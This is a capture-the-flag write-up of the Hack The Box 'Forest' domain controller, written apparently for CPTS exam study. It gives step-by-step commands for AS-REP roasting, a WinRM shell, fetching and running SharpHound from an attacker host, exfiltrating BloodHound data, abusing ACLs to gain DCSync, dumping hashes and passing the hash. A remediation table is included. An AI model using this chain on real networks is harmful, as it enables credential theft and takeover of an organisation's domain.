# Forest — AS-REP Roasting all the way to DCSync

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/forest)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/forest)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=H9FcE_FMZio)

> **Attack path:** RPC null-session user enumeration → AS-REP Roasting `svc-alfresco` → WinRM shell → BloodHound ACL path (Account Operators → Exchange Windows Permissions → WriteDacl on the domain) → DCSync → Administrator.

The classic "misconfiguration chain" AD box: no memory corruption anywhere, just a weak Kerberos policy and one over-generous group. IppSec's walkthrough is the reference here — this write-up mirrors it.

## 1 · Reconnaissance

```bash
echo "10.10.10.161 htb.local forest.htb.local" | sudo tee -a /etc/hosts

nmap -p- --min-rate 10000 -oN forest-allports 10.10.10.161
nmap -p 53,88,135,139,445,464,593,636,3268,3269,5985,9389 -sCV -oN forest-tcpsvc 10.10.10.161
```

The box is a domain controller for `htb.local` (hostname `FOREST`): DNS (53), Kerberos (88), RPC (135), SMB (445), LDAP (389/636/3268/3269), WinRM (5985) and ADWS (9389).

### Nothing in SMB — go to RPC

`smbmap`, `smbclient` and `crackmapexec` all fail to list shares anonymously, but the **RPC null session** is wide open, which leaks the entire user database:

```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200   # Domain Admins
```

Filtering out machine/health-mailbox accounts leaves the real users:

```text
Administrator  Guest  krbtgt  sebastien  lucinda  svc-alfresco  andy  mark  santi
```

`enumdomgroups` also shows the group that will matter later: **Exchange Windows Permissions**.

## 2 · Foothold

### AS-REP Roasting

With a username list and no credentials, test every account for the `DONT_REQ_PREAUTH` flag:

```bash
for user in $(cat users.txt); do
  GetNPUsers.py -no-pass -dc-ip 10.10.10.161 "htb.local/$user" | grep -v "Impacket\|Name\|-\|Password"
done
```

Only one account answers — `svc-alfresco` — and hands back a crackable AS-REP hash without authentication:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:<hash>
```

Crack it with rockyou:

```bash
hashcat -m 18200 svc-alfresco.asrep /usr/share/wordlists/rockyou.txt
# svc-alfresco:<password>
```

- `hashcat -m 18200` = Kerberos 5 AS-REP etype 23 (the GetNPUsers.py output format).

### Shell via WinRM

`svc-alfresco` is a member of **Remote Management Users**, so the cracked password gives an immediate shell:

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p '<password>'
```

## 3 · User flag

```powershell
C:\Users\svc-alfresco\Desktop> type user.txt
<flag>
```

## 4 · Privilege escalation

### BloodHound mapping

Ingest the domain from the evil-winrm session (host SharpHound on your attacker box):

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.14/SharpHound.ps1')
Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LdapUser svc-alfresco -LdapPass '<password>'
```

Exfiltrate the zip (e.g. `smbserver.py share . -smb2support` + `copy <zip> \\10.10.14.14\share\`) and run the built-in query **"Shortest Paths to Domain Admins"**. The path IppSec walks:

```text
svc-alfresco
  → member of Privileged IT Accounts → Account Operators
  → Account Operators has GenericAll on the group "Exchange Windows Permissions"
  → members of Exchange Windows Permissions have WriteDacl on the domain htb.local
  → WriteDacl → grant yourself DS-Replication rights → DCSync
```

### Abusing the ACL chain

A cleanup task (`revert.ps1`, runs every ~5 minutes) resets group membership and the DCSync ACL, so chain the steps quickly. First add ourselves to the group (Account Operators lets you write member lists of most groups):

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
```

Group membership only lands in a **new** logon token, so authenticate explicitly when granting the right:

```powershell
$sec = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.PSCredential('htb\svc-alfresco', $sec)
Add-DomainObjectAcl -Credential $cred -TargetIdentity 'htb.local' `
  -PrincipalIdentity svc-alfresco -Rights DCSync
```

Pure-Impacket alternative from Kali (after the group add):

```bash
dacledit.py -action write -rights DCSync -principal svc-alfresco \
  -target-dn 'DC=htb,DC=local' -dc-ip 10.10.10.161 'htb.local/svc-alfresco:<password>'
```

## 5 · Root flag / Domain Admin

`DCSync` is just "ask the DC to replicate its secrets to me":

```bash
secretsdump.py 'htb.local/svc-alfresco:<password>'@10.10.10.161 -just-dc
```

Grab the Administrator NT hash (`Administrator:500:aad3b...:<hash>:::`) and pass it:

```bash
wmiexec.py -hashes :<hash> htb.local/administrator@10.10.10.161
# or: evil-winrm -i 10.10.10.161 -u administrator -H <hash>
```

```powershell
C:\Users\Administrator\Desktop> type root.txt
<flag>
```

Encore (as IppSec shows): the scheduled task `restore` running `revert.ps1` is what keeps undoing your changes — worth reading as a reminder that defenders do clean up.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Anonymous RPC/SMB enumeration of domain users | Attackers build a targeted user list for password attacks at zero cost | Restrict anonymous remote access (`RestrictRemoteSAM`, network access: deny anonymous), disable the computer browser/RPC null session |
| Account with Kerberos pre-auth disabled (AS-REP Roastable) | Offline cracking of `svc-alfresco`'s password from rockyou | Enable pre-authentication on all accounts; audit with `Get-ADUser -Filter { DoesNotRequirePreauth -eq $true }` |
| Legacy Exchange permission groups (WriteDacl on the domain) | Any Exchange Windows Permissions member can grant DCSync and dump the whole AD database | Remove/stale Exchange ACLs after Exchange decommissioning; run AD ACL auditing (BloodHound, ADRecon) |
| Service account in privileged groups (Account Operators path) | Single weak account cascades to full domain compromise | Apply tiered administration; service accounts get no interactive membership in privileged groups |
| Password policy allows rockyou-crackable passwords | Trivial offline cracking of roasted hashes | Enforce long/passphrase policies; ban breached passwords |

## 7 · CPTS takeaways

- **Enumeration before exploitation**: the whole box falls out of `rpcclient` null-session output — know `enumdomusers`/`enumdomgroups` cold.
- AS-REP Roasting workflow end-to-end: `GetNPUsers.py` → `hashcat -m 18200` → WinRM.
- **BloodHound ACL abuse** (GenericAll → WriteDacl → DCSync) is the single most exam-relevant privesc pattern; practice the "Shortest Paths" queries.
- DCSync with `secretsdump.py -just-dc` and pass-the-hash with Impacket — you will use both in the CPTS AD sets.
- Understand *why* WinRM worked: check group membership (`Remote Management Users`) before assuming SMB-only access.
